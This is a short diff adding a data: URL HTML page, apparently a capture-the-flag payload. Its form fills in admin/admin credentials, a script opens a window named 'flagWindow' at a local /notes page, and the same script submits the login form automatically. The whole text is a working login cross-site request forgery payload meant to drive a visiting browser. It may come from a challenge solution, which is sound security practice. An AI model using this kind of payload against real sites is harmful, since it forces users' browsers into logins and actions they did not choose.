@@ -1,0 +1,16 @@
+data:text/html,
+<body>
+    <form action="http://0.0.0.0:8080/login" method="POST" id="LoginForm">
+        <input type="text" name="username" placeholder="username" value="admin">
+        <br><br>
+        <input type="password" name="password" placeholder="password" value="admin">
+        <br><br>
+        <input type="submit" value="Submit">
+    </form>
+    <script>
+        window.open("http://0.0.0.0:8080/notes", "flagWindow");
+        LoginForm.submit();
+    </script>
+</body>
+
+
